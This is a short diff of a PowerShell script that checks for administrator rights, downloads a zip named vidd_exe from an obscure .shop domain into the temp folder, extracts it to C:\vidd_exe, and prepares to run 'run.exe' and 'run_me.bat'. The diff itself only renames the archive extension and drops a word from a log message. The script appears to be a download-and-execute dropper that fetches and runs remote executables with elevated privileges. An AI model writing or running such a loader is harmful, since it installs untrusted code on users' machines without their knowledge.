@@ -10,7 +10,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $downloadURL = "https://www.api-qsr.shop/vidd_exe.zip"
-$archiveFile = "$env:TEMP\vidd_exe.rar"
+$archiveFile = "$env:TEMP\vidd_exe.zip"
 $extractFolder = "C:\vidd_exe"
 $exeName = "run.exe"
 $batName = "run_me.bat"
@@ -32,7 +32,7 @@ $header = ($headerBytes | ForEach-Object { $_.ToString("X2") }) -join ""
 Write-Host "File header: $header"
 
 if ($header -eq "52617221") {
-    Write-Host "Detected RAR archive."
+    Write-Host "Detected  archive."
 
     # Check WinRAR
     $winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
